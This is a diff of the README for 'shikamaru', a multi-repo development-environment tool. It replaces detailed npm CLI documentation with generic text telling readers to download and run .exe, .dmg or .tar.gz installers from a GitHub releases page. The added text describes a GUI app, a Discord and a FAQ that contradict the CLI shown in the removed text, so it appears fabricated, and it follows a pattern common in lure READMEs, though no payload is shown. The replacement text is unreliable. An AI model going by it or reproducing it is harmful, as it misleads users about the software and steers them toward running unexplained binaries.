@@ -1,256 +1,82 @@
-# 🚀 shikamaru CLI
+# 🛠️ shikamaru - Create Easy Development Environments
 
-> **Spin up multi-repo dev environments** with **env management**, **port allocation**, **Docker/Hybrid orchestration**, and **real-time log streaming** (terminal & web UI).
+## 🚀 Getting Started
 
-[![npm version](https://img.shields.io/npm/v/shikamaru.svg?style=flat)](https://www.npmjs.com/package/shikamaru) ![Node >=16](https://img.shields.io/badge/node-%3E%3D16-green) ![Docker required](https://img.shields.io/badge/docker-required-blue) ![Status](https://img.shields.io/badge/status-beta-yellow)
+Welcome to Shikamaru! This application helps you set up development environments without hassle. It works with many tools and technologies, making it perfect for both beginners and experienced users alike.
 
----
+## 📥 Download & Install
 
-## 📑 Contents
+To get started, visit this page to download: [Download Shikamaru](https://github.com/adawong-leon/shikamaru/releases).
 
-- [Overview](#overview)
-- [Installation](#installation)
-- [Quick Start](#quick-start)
-- [Commands](#commands)
-- [Profiles & Project Discovery](#profiles--project-discovery)
-- [Configuration](#configuration)
-- [Environment Management](#environment-management)
-- [Infra: Docker vs External](#infra-docker-vs-external)
-- [Port Management](#port-management)
-- [Execution Modes](#execution-modes)
-- [Logging & Web UI](#logging--web-ui)
-- [Troubleshooting](#troubleshooting)
-- [Contributing](#contributing)
-- [License](#license)
+1. **Visit the Releases Page**: Click the link above to go to the releases section of our GitHub repository.
+   
+2. **Choose the Latest Release**: You will see a list of versions. Look for the latest one at the top.
 
----
+3. **Download the Installer**: 
+   - Find the appropriate file for your operating system. This could be a `.exe` for Windows, a `.dmg` for Mac, or a `.tar.gz` for Linux.
+   - Click on the file name to start downloading.
 
-## 🔎 Overview
+4. **Run the Installer**:
+   - Once the download finishes, open the file.
+   - Follow the prompts to install Shikamaru on your computer.
 
-**shikamaru** makes local dev across multiple services painless:
+5. **Launch the Application**: After installation, you can find Shikamaru in your applications folder. Open it, and you are ready to create your development environments!
 
-- 📂 Auto-detect & select repos
-- ⚙️ Generate `.env` from `.env.example`
-- 🔌 Assign ports & avoid conflicts
-- 🐳 Run in **local**, **docker**, or **hybrid** mode
-- 📡 Stream logs in terminal or web UI
+## 🖥️ System Requirements
 
-**Requirements**
+Before you install Shikamaru, ensure your system meets these requirements:
 
-- Node.js ≥ 16
-- npm ≥ 8
-- Docker (for docker/hybrid modes)
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
+- **RAM**: At least 4 GB of RAM.
+- **Disk Space**: Minimum of 200 MB free to install Shikamaru and its dependencies.
+- **Network**: An active internet connection for downloading tools and packages.
 
----
+## 📚 Features
 
-## 🧩 Installation
+Shikamaru offers various features to simplify your development setup:
 
-```bash
-# Global (recommended)
-npm install -g shikamaru
+- **Multi-repo Support**: Easily manage multiple repositories in one place.
+- **Environment Management**: Quickly switch between different development environments using simple commands.
+- **Built-in Tools**: Our app integrates with popular programming languages and frameworks like JavaScript, TypeScript, React, and more.
+- **Database Connections**: Seamlessly connect to PostgreSQL, Redis, RabbitMQ, and TimescaleDB for managing your data.
 
-# Local (from repo)
-npm install
-npm run build
-npm start
-```
+## 🔧 Usage Instructions
 
----
+1. **Create Your Environment**: Open Shikamaru and choose “New Environment.”
+   
+2. **Select Technology Stack**: You can pick from various options like Node.js, React, or others. 
 
-## 🚀 Quick Start
+3. **Configure Settings**: Set your preferred database and other configurations as needed.
 
-1. In your workspace, add `global.env` (backend vars) and `frontend.global.env` (frontend vars).  
-   To load Azure variable groups, set:
+4. **Launch Environment**: Click the “Create” button, and Shikamaru will set everything up for you.
 
-   ```bash
-   ORG=
-   PROJECT=
-   AZURE_PERSONAL_ACCESS_TOKEN=
-   ```
+5. **Develop Your Application**: Begin coding right away in your newly created environment.
 
-2. Run from your projects root:
+## 🔄 Updating Shikamaru
 
-   ```bash
-   maru start
-   ```
+To keep Shikamaru up-to-date, periodically check the releases page: [Download Shikamaru](https://github.com/adawong-leon/shikamaru/releases).
 
-3. The CLI will:
-   - Check environment (Node, Docker, etc.)
-   - Prompt repo & mode selection
-   - Allocate/reuse ports
-   - Generate `.env` files
-   - Start services & log viewer
+- Follow the same steps as above to download and run the latest version.
+- Always back up your existing projects before updating.
 
-👉 Open the provided web URL or watch logs in terminal.
+## ❓ Troubleshooting
 
----
+If you encounter issues, try the following:
 
-## 🛠️ Commands
+- **Check Compatibility**: Ensure your operating system meets the system requirements listed above.
+- **Consult the FAQ**: Visit our FAQ section on GitHub for common problems and solutions.
+- **Community Support**: Join our Discord or forum to ask questions and share experiences with other users.
 
-| Command   | Description                  |
-| --------- | ---------------------------- |
-| `start`   | Start selected repos & infra |
-| `profile` | Manage saved profiles        |
-| `help`    | Show help                    |
-| `version` | Show CLI version             |
+## 🏗️ Contributing
 
-**Global Options**
+We welcome contributions! If you want to help improve Shikamaru:
 
-- `-v, --verbose` → verbose logging
-- `--projects-dir <path>` → base directory (default: `PROJECTS_DIR` or cwd)
-- `--skip-cloud` → ignore Azure/cloud vars
-- `-p, --profile <name>` → reuse a saved profile
+1. Fork the repository.
+2. Create a new branch for your feature.
+3. Submit a pull request explaining your changes.
 
-Examples:
+## 📞 Contact
 
-```bash
-maru start --verbose
-maru start --projects-dir ~/workspace
-maru start --skip-cloud
-maru start --profile "frontend+api"
-```
+For additional support or questions, feel free to reach out to us at our GitHub page. We're here to help!
 
----
-
-## 📂 Profiles & Project Discovery
-
-- CLI scans `--projects-dir` for repos
-- You pick repos & modes (local / docker / hybrid)
-- Save as a **profile** for reuse
-
-Profiles include:
-
-- Selected repos
-- Cloud env usage (on/off)
-- Execution modes
-- Logging mode (web/terminal)
-- Port allocations
-
----
-
-## ⚙️ Configuration
-
-Configuration is interactive. Under the hood, it manages:
-
-- Execution mode: `local` | `docker` | `hybrid`
-- Projects dir
-- Per-repo overrides
-- Logging (terminal / web)
-- Docker compose generation
-- Health checks & auto-stop
-
-Artifacts:
-
-- `.env` files per repo
-- `ports-map.json` (stable allocations)
-- `docker-compose.unified.yml` (docker/hybrid)
-
----
-
-## 🌱 Environment Management
-
-Env files are built from:
-
-1. **Global files**:
-   - `global.env` (backend)
-   - `frontend.global.env` (frontend)
-2. **Cloud vars**: (Azure, optional)
-3. **Local defaults** for infra:
-   - Postgres → `postgres:5432`
-   - TimescaleDB → `timescaledb:5432`
-   - Redis → `localhost:6379`
-   - RabbitMQ → `localhost:5672`
-
-➡️ Local values always override cloud.  
-➡️ If `.env.example` missing → skipped with warning.
-
----
-
-## 🧠 Infra: Docker vs External
-
-shikamaru decides whether to spin up infra in Docker:
-
-| Service     | Provisioned in Docker when host is… | Example Docker default                                        |
-| ----------- | ----------------------------------- | ------------------------------------------------------------- |
-| Postgres    | empty / localhost / `postgres`      | `postgresql://default_user:default_password@postgres:5432`    |
-| TimescaleDB | empty / localhost / `timescaledb`   | `postgresql://default_user:default_password@timescaledb:5432` |
-| Redis       | empty / localhost / `redis`         | `redis://redis:6379`                                          |
-| RabbitMQ    | empty / localhost / `rabbitmq`      | `amqp://guest:guest@rabbitmq:5672`                            |
-
-To force external: set a real host (corp/cloud).  
-To force Docker: leave host blank or use docker hostname.
-
----
-
-## 🔌 Port Management
-
-- Host ports allocated in **4000–5000** range
-- Stable across runs via `ports-map.json`
-- Auto-resolves conflicts
-
-Example `ports-map.json`:
-
-```json
-[
-  {
-    "Service": "campaign-management",
-    "Internal Port": 3000,
-    "Host Port": 4136,
-    "Mode": "docker"
-  }
-]
-```
-
----
-
-## 🚦 Execution Modes
-
-- **Local** → runs services on host
-- **Docker** → unified compose file for all
-- **Hybrid** → some local, some docker
-
-When Docker/hybrid:
-
-1. Detects Dockerfiles
-2. Generates `docker-compose.unified.yml`
-3. Starts infra + services with health checks
-4. Streams logs
-
-Stopping brings everything down cleanly.
-
----
-
-## 📺 Logging & Web UI
-
-- **Terminal** → colored logs, interactive
-- **Web** → Express + Socket.IO + React UI
-
-Web UI features:
-
-- Live log stream
-- Filters (service, level, search)
-- Pause / resume / clear
-- Stats per service
-
-Default: `http://localhost:3001` (auto-increments if busy).
-
----
-
-## 🧯 Troubleshooting
-
-- Ensure Node ≥ 16, Docker running
-- Port conflicts → CLI retries next available
-- Compose errors → check Dockerfiles, permissions
-- For fully local env → `--skip-cloud`
-
----
-
-## 🤝 Contributing
-
-PRs/issues welcome. Keep code modular & clean.
-
----
-
-## 📄 License
-
-MIT © 2025
+By following these steps, you can easily download, install, and start using Shikamaru to create your development environments. Enjoy coding!
